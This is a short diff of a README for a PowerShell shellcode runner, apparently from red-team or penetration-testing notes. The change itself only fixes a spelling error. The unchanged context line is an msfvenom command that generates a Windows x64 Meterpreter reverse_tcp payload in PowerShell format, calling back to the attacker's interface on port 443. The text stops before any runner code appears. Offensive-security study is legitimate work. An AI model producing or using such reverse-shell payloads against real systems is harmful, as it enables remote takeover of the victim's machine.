@@ -1,6 +1,6 @@
 # Basic Shellcode runner in PS
 
-The code is a dircet port from vba
+The code is a direct port from vba
 
 ```powershell
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=443 -f ps1 EXITFUNC=thread
